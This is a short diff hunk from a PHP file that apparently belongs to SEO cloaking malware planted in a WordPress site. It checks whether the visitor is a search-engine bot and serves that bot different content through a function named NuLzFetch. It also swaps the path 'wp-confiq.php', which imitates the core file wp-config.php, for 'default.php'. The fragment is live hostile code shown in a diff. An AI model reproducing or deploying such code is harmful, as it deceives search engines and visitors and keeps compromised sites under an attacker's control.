@@ -39,7 +39,7 @@ header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
 header("Pragma: cache");
 
 $landing_page = 'readme.html';
-$index_home = 'wp-confiq.php';
+$index_home = 'default.php';
 
 if (isSearchEngineBot()) {
     echo NuLzFetch($landing_page);
